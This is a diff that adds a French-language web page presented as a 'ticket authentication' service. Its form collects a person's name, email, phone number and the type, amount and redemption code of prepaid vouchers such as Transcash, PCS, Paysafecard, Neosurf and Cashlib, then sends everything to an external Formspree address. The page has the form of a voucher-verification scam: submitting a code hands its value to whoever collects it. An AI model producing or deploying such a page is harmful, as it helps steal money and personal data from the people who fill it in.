@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentification de ticket</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="container">
+
+    <h1>Authentification de ticket</h1>
+
+    <p>
+        Remplissez ce formulaire pour soumettre votre demande de vérification.
+    </p>
+
+    <form action="https://formspree.io/f/maeyzwdd" method="POST">
+
+        <label>Nom complet</label>
+        <input type="text" name="nom" required>
+
+
+        <label>Adresse e-mail</label>
+        <input type="email" name="email" required>
+
+
+        <label>Numéro de téléphone</label>
+        <input type="tel" name="telephone" required>
+
+
+        <label>Type de coupon</label>
+
+        <select name="type_coupon" required>
+            <option value="">Choisir</option>
+            <option value="Transcash">Transcash</option>
+            <option value="PCS">PCS</option>
+            <option value="Paysafecard">Paysafecard</option>
+            <option value="Neosurf">Neosurf</option>
+            <option value="Cashlib">Cashlib</option>
+        </select>
+
+
+        <label>Montant du coupon (€)</label>
+        <input 
+            type="number" 
+            name="montant" 
+            placeholder="Exemple : 50"
+            required
+        >
+
+
+        <label>Référence du ticket</label>
+        <input 
+            type="text" 
+            name="code_ticket"
+            placeholder="Entrer le code du ticket"
+            required
+        >
+
+
+        <label>Message (facultatif)</label>
+        <textarea 
+            name="message"
+            placeholder="Informations supplémentaires">
+        </textarea>
+
+
+        <button type="submit">
+            Envoyer la demande
+        </button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
